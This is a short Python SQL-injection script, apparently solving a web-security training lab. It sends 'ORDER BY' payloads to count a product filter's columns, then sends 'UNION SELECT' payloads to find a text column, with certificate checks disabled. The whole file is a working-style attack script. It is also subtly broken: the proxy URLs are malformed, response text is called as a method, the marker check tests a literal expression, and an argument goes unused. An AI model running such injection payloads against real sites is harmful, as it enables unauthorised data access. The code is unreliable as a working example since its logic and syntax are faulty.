import sys
import requests
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http//127.0.0.1:8080', 'https':'https//127.0.0.1:8080'}

def exploit_sqli_Un(s, url):
    path = "/filter?category=Gifts"
    for i in range(1,50):
        sql_payload = "'+ORDER+BY+%s--"%i
        r = s.get(url+path+sql_payload, verify=False, proxies=proxies)
        res = r.text()
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1
    return False

def exploit_sqli_String(s, num_columns,url):
    path = "/filter?category=Gifts"
    for i in range(1,num_columns+1):
        string = "v2F6UA"
        payload_list = ['null'] * num_columns
        payload_list[i-1] = string
        sql_payload = "'UNION SELECT " + ','.join(payload_list) + '--'
        r = s.get(url+path+sql_payload, verify=False, proxies=proxies)
        res = r.text()
        if "string.strip('\"')" in res:
            return i 
    return False

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(" (+) Usage: %s <url><payload>" % sys.argv [0])
        print(" (+) Example: %s www.example.com ' 1=1 '" % sys.argv[0])
        sys.exit(-1)   
    
    s = requests.Session()
    print("(+) Finding the number of columns")
    num_columns = exploit_sqli_Un(s, url)
    
    if num_columns:
        print("(+) The number of columns is: " + str(num_columns) + ".")
        
        print("(+) Finding which column contains text")
        string_columns = exploit_sqli_String(s,num_columns,url) 
        
        if string_columns:
            print("(+) The columns that contains string feild is: " + str(string_columns) + ".")
        else:
            print("(+) We are not able to find the columns that contain string feild")
    else:
        print("(+) SQLi Failure")